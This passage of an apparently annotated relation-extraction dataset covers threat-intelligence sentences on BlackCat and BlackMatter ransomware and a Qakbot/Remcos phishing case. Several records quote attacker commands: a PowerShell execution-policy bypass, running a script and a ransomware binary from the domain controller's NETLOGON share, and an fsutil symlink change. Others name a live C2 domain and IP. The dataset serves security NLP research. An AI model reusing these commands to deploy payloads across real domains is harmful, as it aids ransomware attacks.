"MP", "sent_id": 5, "global_pos": [88, 88], "name": "BlackCat ransomware", "pos": [5, 7], "index": "8_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [102, 102], "name": "defender.vbs", "pos": [19, 20], "index": "9_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [107, 107], "name": "BlackMatter attack", "pos": [2, 4], "index": "10_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [119, 119], "name": "def.vbs", "pos": [14, 15], "index": "11_0"}]], "labels": [{"r": "RD", "evidence": [0], "h": 0, "t": 1}, {"r": "WR", "evidence": [0, 1, 2, 3], "h": 0, "t": 4}, {"r": "CO", "evidence": [0, 1], "h": 0, "t": 2}, {"r": "WR", "evidence": [1], "h": 2, "t": 3}, {"r": "EX", "evidence": [1], "h": 2, "t": 3}, {"r": "WR", "evidence": [3, 4], "t": 4, "h": 5}, {"r": "EX", "evidence": [4], "h": 5, "t": 6}, {"r": "WR", "evidence": [4], "h": 5, "t": 7}, {"r": "CO", "evidence": [4, 5], "h": 5, "t": 8}, {"r": "CO", "evidence": [4, 5, 6], "h": 5, "t": 10}, {"r": "EX", "evidence": [5], "h": 8, "t": 9}, {"r": "WR", "evidence": [6], "h": 10, "t": 11}, {"r": "EX", "evidence": [6], "h": 10, "t": 11}]}, {"title": "029-47", "sents": [["Next", ",", "the", "attacker", "introduced", "and", "ran", "a", "file", "known", "as", "``", "apply.ps1", ".", "''", "The", "execution", "command", "utilized", "was", ":"], ["``", "c", ":", "\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe", "-exec", "bypass", ".\\apply.ps1", "''", "."], ["This", "action", "led", "to", "the", "immediate", "storage", "of", "group", "policy", "files", "on", "the", "disk", "."], ["Following", "this", ",", "the", "attackers", "used", "a", "command", "to", "enforce", "the", "deployment", "of", "the", "group", "policy", "."], ["Shortly", "before", "the", "commencement", "of", "BlackCat", "ransomware", "'s", "encryption", "of", "files", ",", "the", "intruders", "initiated", "a", "script", "named", "``", "defender.vbs", ".", "''"], ["In", "the", "BlackMatter", "attack", ",", "a", "file", "with", "the", "same", "content", "was", "named", "``", "def.vbs", "''", "and", "executed", "a", "few", "moments", "before", "the", "encryption", "procedure", "began", "."], ["The", "command", "used", "for", "execution", "was", "``", "cmd.exe", "/c", "\\", "<", "domaincontroller", ">", "\\netlogon\\def.vbs", "''", "."], ["During", "the", "onset", "of", "encryption", ",", "a", "ransomware", "file", "was", "dropped", "on", "domain", "servers", "in", "the", "SYSVOL", "folder", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [3, 3], "name": "attacker", "pos": [3, 4], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [12, 12], "name": "apply.ps1", "pos": [12, 13], "index": "1_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [38, 38], "name": "group policy files", "pos": [8, 11], "index": "2_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [49, 49], "name": "attackers", "pos": [4, 5], "index": "3_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [52, 52], "name": "command", "pos": [7, 8], "index": "4_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [59, 59], "name": "group policy", "pos": [14, 16], "index": "5_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [67, 67], "name": "BlackCat ransomware", "pos": [5, 7], "index": "6_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [81, 81], "name": "defender.vbs", "pos": [19, 20], "index": "7_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [86, 86], "name": "BlackMatter attack", "pos": [2, 4], "index": "8_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [98, 98], "name": "def.vbs", "pos": [14, 15], "index": "9_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [134, 134], "name": "ransomware file", "pos": [7, 9], "index": "10_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [139, 139], "name": "domain servers", "pos": [12, 14], "index": "11_0"}]], "labels": [{"r": "WR", "evidence": [0], "h": 0, "t": 1}, {"r": "EX", "evidence": [0], "h": 0, "t": 1}, {"r": "WR", "evidence": [2, 3], "t": 2, "h": 3}, {"r": "EX", "evidence": [3], "h": 3, "t": 4}, {"r": "WR", "evidence": [3], "h": 3, "t": 5}, {"r": "CO", "evidence": [3, 4], "h": 3, "t": 6}, {"r": "CO", "evidence": [3, 4, 5], "h": 3, "t": 8}, {"r": "EX", "evidence": [4], "h": 6, "t": 7}, {"r": "WR", "evidence": [5], "h": 8, "t": 9}, {"r": "EX", "evidence": [5], "h": 8, "t": 9}, {"r": "WR", "evidence": [5, 6, 7], "h": 8, "t": 10}, {"r": "ST", "evidence": [5, 6, 7], "h": 8, "t": 11}]}, {"title": "029-48", "sents": [["``", "c", ":", "\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe", "-exec", "bypass", ".\\apply.ps1", "''", "."], ["This", "action", "led", "to", "the", "immediate", "storage", "of", "group", "policy", "files", "on", "the", "disk", "."], ["Following", "this", ",", "the", "attackers", "used", "a", "command", "to", "enforce", "the", "deployment", "of", "the", "group", "policy", "."], ["Shortly", "before", "the", "commencement", "of", "BlackCat", "ransomware", "'s", "encryption", "of", "files", ",", "the", "intruders", "initiated", "a", "script", "named", "``", "defender.vbs", ".", "''"], ["In", "the", "BlackMatter", "attack", ",", "a", "file", "with", "the", "same", "content", "was", "named", "``", "def.vbs", "''", "and", "executed", "a", "few", "moments", "before", "the", "encryption", "procedure", "began", "."], ["The", "command", "used", "for", "execution", "was", "``", "cmd.exe", "/c", "\\", "<", "domaincontroller", ">", "\\netlogon\\def.vbs", "''", "."], ["During", "the", "onset", "of", "encryption", ",", "a", "ransomware", "file", "was", "dropped", "on", "domain", "servers", "in", "the", "SYSVOL", "folder", "."], ["This", "made", "it", "easily", "accessible", "on", "the", "NETLOGON", "network", "share", "available", "to", "all", "domain", "users", "."]], "vertexSet": [[{"type": "MF", "sent_id": 1, "global_pos": [17, 17], "name": "group policy files", "pos": [8, 11], "index": "0_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [28, 28], "name": "attackers", "pos": [4, 5], "index": "1_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [31, 31], "name": "command", "pos": [7, 8], "index": "2_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [38, 38], "name": "group policy", "pos": [14, 16], "index": "3_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [46, 46], "name": "BlackCat ransomware", "pos": [5, 7], "index": "4_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [60, 60], "name": "defender.vbs", "pos": [19, 20], "index": "5_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [65, 65], "name": "BlackMatter attack", "pos": [2, 4], "index": "6_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [77, 77], "name": "def.vbs", "pos": [14, 15], "index": "7_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [113, 113], "name": "ransomware file", "pos": [7, 9], "index": "8_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [118, 118], "name": "domain servers", "pos": [12, 14], "index": "9_0"}]], "labels": [{"r": "WR", "evidence": [1, 2], "t": 0, "h": 1}, {"r": "EX", "evidence": [2], "h": 1, "t": 2}, {"r": "WR", "evidence": [2], "h": 1, "t": 3}, {"r": "CO", "evidence": [2, 3], "h": 1, "t": 4}, {"r": "CO", "evidence": [2, 3, 4], "h": 1, "t": 6}, {"r": "EX", "evidence": [3], "h": 4, "t": 5}, {"r": "WR", "evidence": [4], "h": 6, "t": 7}, {"r": "EX", "evidence": [4], "h": 6, "t": 7}, {"r": "WR", "evidence": [4, 5, 6], "h": 6, "t": 8}, {"r": "ST", "evidence": [4, 5, 6], "h": 6, "t": 9}]}, {"title": "029-49", "sents": [["This", "action", "led", "to", "the", "immediate", "storage", "of", "group", "policy", "files", "on", "the", "disk", "."], ["Following", "this", ",", "the", "attackers", "used", "a", "command", "to", "enforce", "the", "deployment", "of", "the", "group", "policy", "."], ["Shortly", "before", "the", "commencement", "of", "BlackCat", "ransomware", "'s", "encryption", "of", "files", ",", "the", "intruders", "initiated", "a", "script", "named", "``", "defender.vbs", ".", "''"], ["In", "the", "BlackMatter", "attack", ",", "a", "file", "with", "the", "same", "content", "was", "named", "``", "def.vbs", "''", "and", "executed", "a", "few", "moments", "before", "the", "encryption", "procedure", "began", "."], ["The", "command", "used", "for", "execution", "was", "``", "cmd.exe", "/c", "\\", "<", "domaincontroller", ">", "\\netlogon\\def.vbs", "''", "."], ["During", "the", "onset", "of", "encryption", ",", "a", "ransomware", "file", "was", "dropped", "on", "domain", "servers", "in", "the", "SYSVOL", "folder", "."], ["This", "made", "it", "easily", "accessible", "on", "the", "NETLOGON", "network", "share", "available", "to", "all", "domain", "users", "."], ["File", "encryption", "allowed", "all", "systems", "to", "execute", "these", "remotely", "shared", "files", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [8, 8], "name": "group policy files", "pos": [8, 11], "index": "0_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [19, 19], "name": "attackers", "pos": [4, 5], "index": "1_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [22, 22], "name": "command", "pos": [7, 8], "index": "2_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [29, 29], "name": "group policy", "pos": [14, 16], "index": "3_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [37, 37], "name": "BlackCat ransomware", "pos": [5, 7], "index": "4_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [51, 51], "name": "defender.vbs", "pos": [19, 20], "index": "5_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [56, 56], "name": "BlackMatter attack", "pos": [2, 4], "index": "6_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [68, 68], "name": "def.vbs", "pos": [14, 15], "index": "7_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [104, 104], "name": "ransomware file", "pos": [7, 9], "index": "8_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [109, 109], "name": "domain servers", "pos": [12, 14], "index": "9_0"}]], "labels": [{"r": "WR", "evidence": [0, 1], "t": 0, "h": 1}, {"r": "EX", "evidence": [1], "h": 1, "t": 2}, {"r": "WR", "evidence": [1], "h": 1, "t": 3}, {"r": "CO", "evidence": [1, 2], "h": 1, "t": 4}, {"r": "CO", "evidence": [1, 2, 3], "h": 1, "t": 6}, {"r": "EX", "evidence": [2], "h": 4, "t": 5}, {"r": "WR", "evidence": [3], "h": 6, "t": 7}, {"r": "EX", "evidence": [3], "h": 6, "t": 7}, {"r": "WR", "evidence": [3, 4, 5], "h": 6, "t": 8}, {"r": "ST", "evidence": [3, 4, 5], "h": 6, "t": 9}]}, {"title": "029-50", "sents": [["Following", "this", ",", "the", "attackers", "used", "a", "command", "to", "enforce", "the", "deployment", "of", "the", "group", "policy", "."], ["Shortly", "before", "the", "commencement", "of", "BlackCat", "ransomware", "'s", "encryption", "of", "files", ",", "the", "intruders", "initiated", "a", "script", "named", "``", "defender.vbs", ".", "''"], ["In", "the", "BlackMatter", "attack", ",", "a", "file", "with", "the", "same", "content", "was", "named", "``", "def.vbs", "''", "and", "executed", "a", "few", "moments", "before", "the", "encryption", "procedure", "began", "."], ["The", "command", "used", "for", "execution", "was", "``", "cmd.exe", "/c", "\\", "<", "domaincontroller", ">", "\\netlogon\\def.vbs", "''", "."], ["During", "the", "onset", "of", "encryption", ",", "a", "ransomware", "file", "was", "dropped", "on", "domain", "servers", "in", "the", "SYSVOL", "folder", "."], ["This", "made", "it", "easily", "accessible", "on", "the", "NETLOGON", "network", "share", "available", "to", "all", "domain", "users", "."], ["File", "encryption", "allowed", "all", "systems", "to", "execute", "these", "remotely", "shared", "files", "."], ["For", "instance", ",", "``", "cmd.exe", "-c", "\\", "<", "domain", "controller", ">", "\\netlogon", "<", "num", ">", ".exe", "--", "access-token", "<", "token", ">", "''", "or", "``", "cmd.exe", "-c", "\\", "<", "domain", "controller", ">", "\\netlogon", "<", "num", ">", ".exe", "''", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [4, 4], "name": "attackers", "pos": [4, 5], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [7, 7], "name": "command", "pos": [7, 8], "index": "1_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [14, 14], "name": "group policy", "pos": [14, 16], "index": "2_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [22, 22], "name": "BlackCat ransomware", "pos": [5, 7], "index": "3_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [36, 36], "name": "defender.vbs", "pos": [19, 20], "index": "4_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [41, 41], "name": "BlackMatter attack", "pos": [2, 4], "index": "5_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [53, 53], "name": "def.vbs", "pos": [14, 15], "index": "6_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [89, 89], "name": "ransomware file", "pos": [7, 9], "index": "7_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [94, 94], "name": "domain servers", "pos": [12, 14], "index": "8_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [141, 141], "name": "< num > .exe", "pos": [12, 16], "index": "9_0"}]], "labels": [{"r": "EX", "evidence": [0], "h": 0, "t": 1}, {"r": "WR", "evidence": [0], "h": 0, "t": 2}, {"r": "WR", "evidence": [0, 1, 2, 3, 4, 5, 6, 7], "h": 0, "t": 9}, {"r": "CO", "evidence": [0, 1], "h": 0, "t": 3}, {"r": "CO", "evidence": [0, 1, 2], "h": 0, "t": 5}, {"r": "EX", "evidence": [1], "h": 3, "t": 4}, {"r": "WR", "evidence": [2], "h": 5, "t": 6}, {"r": "EX", "evidence": [2], "h": 5, "t": 6}, {"r": "WR", "evidence": [2, 3, 4], "h": 5, "t": 7}, {"r": "ST", "evidence": [2, 3, 4], "h": 5, "t": 8}]}, {"title": "029-51", "sents": [["Shortly", "before", "the", "commencement", "of", "BlackCat", "ransomware", "'s", "encryption", "of", "files", ",", "the", "intruders", "initiated", "a", "script", "named", "``", "defender.vbs", ".", "''"], ["In", "the", "BlackMatter", "attack", ",", "a", "file", "with", "the", "same", "content", "was", "named", "``", "def.vbs", "''", "and", "executed", "a", "few", "moments", "before", "the", "encryption", "procedure", "began", "."], ["The", "command", "used", "for", "execution", "was", "``", "cmd.exe", "/c", "\\", "<", "domaincontroller", ">", "\\netlogon\\def.vbs", "''", "."], ["During", "the", "onset", "of", "encryption", ",", "a", "ransomware", "file", "was", "dropped", "on", "domain", "servers", "in", "the", "SYSVOL", "folder", "."], ["This", "made", "it", "easily", "accessible", "on", "the", "NETLOGON", "network", "share", "available", "to", "all", "domain", "users", "."], ["File", "encryption", "allowed", "all", "systems", "to", "execute", "these", "remotely", "shared", "files", "."], ["For", "instance", ",", "``", "cmd.exe", "-c", "\\", "<", "domain", "controller", ">", "\\netlogon", "<", "num", ">", ".exe", "--", "access-token", "<", "token", ">", "''", "or", "``", "cmd.exe", "-c", "\\", "<", "domain", "controller", ">", "\\netlogon", "<", "num", ">", ".exe", "''", "."], ["The", "BlackMatter", "and", "BlackCat", "attacks", "employed", "similar", "<", "num", ">", ".exe", "file", "names", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [5, 5], "name": "BlackCat ransomware", "pos": [5, 7], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [19, 19], "name": "defender.vbs", "pos": [19, 20], "index": "1_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [24, 24], "name": "BlackMatter attack", "pos": [2, 4], "index": "2_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [36, 36], "name": "def.vbs", "pos": [14, 15], "index": "3_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [72, 72], "name": "ransomware file", "pos": [7, 9], "index": "4_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [77, 77], "name": "domain servers", "pos": [12, 14], "index": "5_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [124, 124], "name": "< num > .exe", "pos": [12, 16], "index": "6_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [153, 153], "name": "BlackCat attacks", "pos": [3, 5], "index": "7_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [157, 157], "name": "< num > .exe", "pos": [7, 11], "index": "8_0"}]], "labels": [{"r": "EX", "evidence": [0], "h": 0, "t": 1}, {"r": "WR", "evidence": [1], "h": 2, "t": 3}, {"r": "EX", "evidence": [1], "h": 2, "t": 3}, {"r": "WR", "evidence": [1, 2, 3], "h": 2, "t": 4}, {"r": "ST", "evidence": [1, 2, 3], "h": 2, "t": 5}, {"r": "WR", "evidence": [6, 7], "t": 6, "h": 7}, {"r": "EX", "evidence": [7], "h": 7, "t": 8}]}, {"title": "029-52", "sents": [["In", "the", "BlackMatter", "attack", ",", "a", "file", "with", "the", "same", "content", "was", "named", "``", "def.vbs", "''", "and", "executed", "a", "few", "moments", "before", "the", "encryption", "procedure", "began", "."], ["The", "command", "used", "for", "execution", "was", "``", "cmd.exe", "/c", "\\", "<", "domaincontroller", ">", "\\netlogon\\def.vbs", "''", "."], ["During", "the", "onset", "of", "encryption", ",", "a", "ransomware", "file", "was", "dropped", "on", "domain", "servers", "in", "the", "SYSVOL", "folder", "."], ["This", "made", "it", "easily", "accessible", "on", "the", "NETLOGON", "network", "share", "available", "to", "all", "domain", "users", "."], ["File", "encryption", "allowed", "all", "systems", "to", "execute", "these", "remotely", "shared", "files", "."], ["For", "instance", ",", "``", "cmd.exe", "-c", "\\", "<", "domain", "controller", ">", "\\netlogon", "<", "num", ">", ".exe", "--", "access-token", "<", "token", ">", "''", "or", "``", "cmd.exe", "-c", "\\", "<", "domain", "controller", ">", "\\netlogon", "<", "num", ">", ".exe", "''", "."], ["The", "BlackMatter", "and", "BlackCat", "attacks", "employed", "similar", "<", "num", ">", ".exe", "file", "names", "."], ["These", "executables", "were", "deployed", "with", "additional", "commands", "that", "bolstered", "their", "efficiency", "during", "execution", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [2, 2], "name": "BlackMatter attack", "pos": [2, 4], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [14, 14], "name": "def.vbs", "pos": [14, 15], "index": "1_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [50, 50], "name": "ransomware file", "pos": [7, 9], "index": "2_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [55, 55], "name": "domain servers", "pos": [12, 14], "index": "3_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [102, 102], "name": "< num > .exe", "pos": [12, 16], "index": "4_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [131, 131], "name": "BlackCat attacks", "pos": [3, 5], "index": "5_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [135, 135], "name": "< num > .exe", "pos": [7, 11], "index": "6_0"}]], "labels": [{"r": "WR", "evidence": [0], "h": 0, "t": 1}, {"r": "EX", "evidence": [0], "h": 0, "t": 1}, {"r": "WR", "evidence": [0, 1, 2], "h": 0, "t": 2}, {"r": "ST", "evidence": [0, 1, 2], "h": 0, "t": 3}, {"r": "WR", "evidence": [5, 6], "t": 4, "h": 5}, {"r": "EX", "evidence": [6], "h": 5, "t": 6}]}, {"title": "029-53", "sents": [["The", "command", "used", "for", "execution", "was", "``", "cmd.exe", "/c", "\\", "<", "domaincontroller", ">", "\\netlogon\\def.vbs", "''", "."], ["During", "the", "onset", "of", "encryption", ",", "a", "ransomware", "file", "was", "dropped", "on", "domain", "servers", "in", "the", "SYSVOL", "folder", "."], ["This", "made", "it", "easily", "accessible", "on", "the", "NETLOGON", "network", "share", "available", "to", "all", "domain", "users", "."], ["File", "encryption", "allowed", "all", "systems", "to", "execute", "these", "remotely", "shared", "files", "."], ["For", "instance", ",", "``", "cmd.exe", "-c", "\\", "<", "domain", "controller", ">", "\\netlogon", "<", "num", ">", ".exe", "--", "access-token", "<", "token", ">", "''", "or", "``", "cmd.exe", "-c", "\\", "<", "domain", "controller", ">", "\\netlogon", "<", "num", ">", ".exe", "''", "."], ["The", "BlackMatter", "and", "BlackCat", "attacks", "employed", "similar", "<", "num", ">", ".exe", "file", "names", "."], ["These", "executables", "were", "deployed", "with", "additional", "commands", "that", "bolstered", "their", "efficiency", "during", "execution", "."], ["One", "such", "command", "was", "``", "c", ":", "\\windows\\system32\\cmd.exe", "/c", "fsutil", "behavior", "set", "symlinkevaluation", "r2l:1", "''", "."]], "vertexSet": [[{"type": "MF", "sent_id": 1, "global_pos": [23, 23], "name": "ransomware file", "pos": [7, 9], "index": "0_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [28, 28], "name": "domain servers", "pos": [12, 14], "index": "1_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [75, 75], "name": "< num > .exe", "pos": [12, 16], "index": "2_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [104, 104], "name": "BlackCat attacks", "pos": [3, 5], "index": "3_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [108, 108], "name": "< num > .exe", "pos": [7, 11], "index": "4_0"}]], "labels": [{"r": "WR", "evidence": [4, 5], "t": 2, "h": 3}, {"r": "EX", "evidence": [5], "h": 3, "t": 4}]}, {"title": "017-0", "sents": [["CTIR", "reported", "discovering", "a", "malevolent", "Microsoft", "Excel", "file", "(", "XLS", ")", ",", "which", "was", "spread", "via", "phishing", "emails", "in", "a", "U.S.", "healthcare", "facility", ",", "and", "delivered", "a", "variation", "of", "the", "Remcos", "Remote", "Access", "Trojan", "(", "RAT", ")", "."], ["During", "the", "period", "of", "the", "alleged", "attack", ",", "CTIR", "discovered", "remote", "network", "connections", "that", "had", "been", "initiated", "via", "a", "systems", "administrator", "account", "."], ["Users", "must", "enable", "macros", "before", "the", "containing", "Visual", "Basic", "code", "is", "executed", "within", "the", "said", "XLS", "file", "."], ["After", "performing", "a", "PowerShell", "command", ",", "an", "IP", "address", "(", "209.127.19.101", ")", "is", "detected", "that", "subsequently", "downloads", "the", "next", "cycle", "of", "infection", "phases", "from", "URLs", "hosted", "on", "that", "IP", "."], ["The", "scrubbed", "legitimate", "content", "removed", "specific", "email", "addresses", "from", "the", "earlier", "email", "communication", ",", "although", "the", "cause", "for", "this", "is", "currently", "unknown", "."], ["Upon", "inspection", "of", "the", "targeted", "system", ",", "CTIR", "witnessed", "the", "download", "of", "a", "ZIP", "file", "to", "the", "following", "directory", ",", "``", "C", ":", "/Users/", "<", "user", ">", "/Downloads", ",", "''", "after", "the", "end", "user", "clicked", "on", "the", "harmful", "URL", "."], ["The", "ZIP", "file", "included", "a", "Windows", "shortcut", "(", "LNK", ")", "file", "with", "content", "that", "instructed", "the", "device", "to", "generate", "a", "directory", "beneath", "the", "user", "profile", "and", "attempt", "to", "connect", "with", "a", "Command", "and", "Control", "(", "C2", ")", "domain", "(", "bottlenuts.com", ")", "to", "get", "a", "file", "and", "execute", "it", "using", "``", "regsvr32.exe", ",", "''", "the", "Windows", "utility", "."], ["Although", "the", "Qakbot", "payload", "did", "not", "execute", "due", "to", "the", "user", "'s", "intervention", ",", "the", "C2", "domain", "and", "command", "line", "arguments", "are", "consistent", "with", "a", "recent", "publicized", "Qakbot", "campaign", ",", "suggesting", "that", "they", "are", "part", "of", "the", "same", "initiative", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [9, 9], "name": "XLS", "pos": [9, 10], "index": "0_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [35, 35], "name": "RAT", "pos": [35, 36], "index": "1_0"}], [{"type": "TP", "sent_id": 2, "global_pos": [61, 61], "name": "Users", "pos": [0, 1], "index": "2_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [76, 76], "name": "XLS", "pos": [15, 16], "index": "3_0"}], [{"type": "TP", "sent_id": 3, "global_pos": [82, 82], "name": "PowerShell", "pos": [3, 4], "index": "4_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [89, 89], "name": "209.127.19.101", "pos": [10, 11], "index": "5_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [145, 145], "name": "ZIP file", "pos": [13, 15], "index": "6_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [173, 173], "name": "ZIP", "pos": [1, 2], "index": "7_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [180, 180], "name": "LNK", "pos": [8, 9], "index": "8_0"}], [{"type": "SF", "sent_id": 6, "global_pos": [195, 195], "name": "user profile", "pos": [23, 25], "index": "9_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [203, 203], "name": "Command", "pos": [31, 32], "index": "10_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [211, 211], "name": "bottlenuts.com", "pos": [39, 40], "index": "11_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [219, 219], "name": "it", "pos": [47, 48], "index": "12_0"}], [{"type": "TP", "sent_id": 6, "global_pos": [222, 222], "name": "regsvr32.exe", "pos": [50, 51], "index": "13_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [244, 244], "name": "C2 domain", "pos": [15, 17], "index": "14_0"}]], "labels": [{"r": "CO", "evidence": [0, 1, 2, 3, 4, 5, 6], "h": 1, "t": 7}, {"r": "WR", "evidence": [0, 1, 2], "t": 0, "h": 2}, {"r": "RD", "evidence": [2], "h": 2, "t": 3}, {"r": "ST", "evidence": [3], "h": 4, "t": 5}, {"r": "RF", "evidence": [3], "h": 4, "t": 5}, {"r": "WR", "evidence": [3, 4, 5], "h": 4, "t": 6}, {"r": "FR", "evidence": [3, 4, 5, 6], "h": 4, "t": 7}, {"r": "EX", "evidence": [5, 6], "t": 6, "h": 7}, {"r": "FR", "evidence": [6], "t": 10, "h": 13}, {"r": "RD", "evidence": [6], "t": 9, "h": 10}, {"r": "WR", "evidence": [6], "t": 9, "h": 10}, {"r": "ST", "evidence": [6], "h": 10, "t": 11}, {"r": "FR", "evidence": [6], "h": 7, "t": 13}, {"r": "RD", "evidence": [6], "t": 9, "h": 10}, {"r": "EX", "evidence": [6], "t": 12, "h": 13}, {"r": "CO", "evidence": [6], "h": 8, "t": 12}]}, {"title": "017-1", "sents": [["During", "the", "period", "of", "the", "alleged", "attack", ",", "CTIR", "discovered", "remote", "network", "connections", "that", "had", "been", "initiated", "via", "a", "systems", "administrator", "account", "."], ["Users", "must", "enable", "macros", "before", "the", "containing", "Visual", "Basic", "code", "is", "executed", "within", "the", "said", "XLS", "file", "."], ["After", "performing", "a", "PowerShell", "command", ",", "an", "IP", "address", "(", "209.127.19.101", ")", "is", "detected", "that", "subsequently", "downloads", "the", "next", "cycle", "of", "infection", "phases", "from", "URLs", "hosted", "on", "that", "IP", "."], ["The", "scrubbed", "legitimate", "content", "removed", "specific", "email", "addresses", "from", "the", "earlier", "email", "communication", ",", "although", "the", "cause", "for", "this", "is", "currently", "unknown", "."], ["Upon", "inspection", "of", "the", "targeted", "system", ",", "CTIR", "witnessed", "the", "download", "of", "a", "ZIP", "file", "to", "the", "following", "directory", ",", "``", "C", ":", "/Users/", "<", "user", ">", "/Downloads", ",", "''", "after", "the", "end", "user", "clicked", "on", "the", "harmful", "URL", "."], ["The", "ZIP", "file", "included", "a", "Windows", "shortcut", "(", "LNK", ")", "file", "with", "content", "that", "instructed", "the", "device", "to", "generate", "a", "directory", "beneath", "the", "user", "profile", "and", "attempt", "to", "connect", "with", "a", "Command", "and", "Control", "(", "C2", ")", "domain", "(", "bottlenuts.com", ")", "to", "get", "a", "file", "and", "execute", "it", "using", "``", "regsvr32.exe", ",", "''", "the", "Windows", "utility", "."], ["Although", "the", "Qakbot", "payload", "did", "not", "execute", "due", "to", "the", "user", "'s", "intervention", ",", "the", "C2", "domain", "and", "command", "line", "arguments", "are", "consistent", "with", "a", "recent", "publicized", "Qakbot", "campaign", ",", "suggesting", "that", "they", "are", "part", "of", "the", "same", "initiative", "."], ["Due", "to", "a", "lack", "of", "logging", ",", "the", "initial", "access", "point", "could", "not", "be", "determined", "in", "this", "case", "."]], "vertexSet": [[{"type": "TP", "sent_id": 1, "global_pos": [23, 23], "name": "Users", "pos": [0, 1], "index": "0_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [38, 38], "name": "XLS", "pos": [15, 16], "index": "1_0"}], [{"type": "TP", "sent_id": 2, "global_pos": [44, 44], "name": "PowerShell", "pos": [3, 4], "index": "2_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [51, 51], "name": "209.127.19.101", "pos": [10, 11], "index": "3_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [107, 107], "name": "ZIP file", "pos": [13, 15], "index": "4_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [135, 135], "name": "ZIP", "pos": [1, 2], "index": "5_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [142, 142], "name": "LNK", "pos": [8, 9], "index": "6_0"}], [{"type": "SF", "sent_id": 5, "global_pos": [157, 157], "name": "user profile", "pos": [23, 25], "index": "7_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [165, 165], "name": "Command", "pos": [31, 32], "index": "8_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [173, 173], "name": "bottlenuts.com", "pos": [39, 40], "index": "9_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [181, 181], "name": "it", "pos": [47, 48], "index": "10_0"}], [{"type": "TP", "sent_id": 5, "global_pos": [184, 184], "name": "regsvr32.exe", "pos": [50, 51], "index": "11_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [206, 206], "name": "C2 domain", "pos": [15, 17], "index": "12_0"}]], "labels": [{"r": "RD", "evidence": [1], "h": 0, "t": 1}, {"r": "ST", "evidence": [2], "h": 2, "t": 3}, {"r": "RF", "evidence": [2], "h": 2, "t": 3}, {"r": "WR", "evidence": [2, 3, 4], "h": 2, "t": 